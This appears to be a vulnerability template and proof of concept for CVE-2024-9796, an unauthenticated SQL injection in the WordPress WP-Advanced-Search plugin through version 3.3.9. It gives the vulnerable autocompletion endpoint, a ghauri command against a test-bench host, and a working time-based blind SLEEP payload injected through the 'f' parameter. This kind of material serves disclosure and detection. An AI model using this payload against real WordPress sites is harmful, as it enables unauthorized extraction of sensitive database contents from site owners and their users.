id: CVE-2024-9796 

info:
  name: "WordPress WP-Advanced-Search <= 3.3.9 - Unauthenticated SQL Injection"
  author: "Issam Junior"
  severity: "critical"
  metadata:
    verified: true
    max-request: 2
  tags: "github.com/fa-rrel ==> WHAT DO YOU THINK ABOUT ME ?"

variables:
  cve: "CVE-2024-9796"
  plugin_name: "wp-advanced-search"
  plugin_version: "3.3.9"
  type: "plugin"
  description: |
    The WordPress WP-Advanced-Search plugin for WordPress is vulnerable to SQL Injection in all versions up to, and including, 3.3.9. 
    This vulnerability is caused by insufficient escaping on user-supplied parameters and a lack of proper preparation of the existing SQL query.
    This makes it possible for unauthenticated attackers to append arbitrary SQL queries to existing queries, potentially leading to the 
    extraction of sensitive information from the database.
  download_link: "https://downloads.wordpress.org/plugin/wp-advanced-search.3.3.9.zip"
  cvss_score: 7.5

poc:
  - "ghauri -u \"https://wpscan-vulnerability-test-bench.ddev.site/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?t=wp_autosuggest&f=words&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=19692269759899\""
  - "Parameter: f (GET)"
  - "Type: time-based blind"
  - "Title: MySQL >= 5.0.12 time-based blind (IF - comment)"
  - "Payload: t=wp_autosuggest&f=if(now()=sysdate(),SLEEP(9),0)-- wXyW&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=13672261755853'"
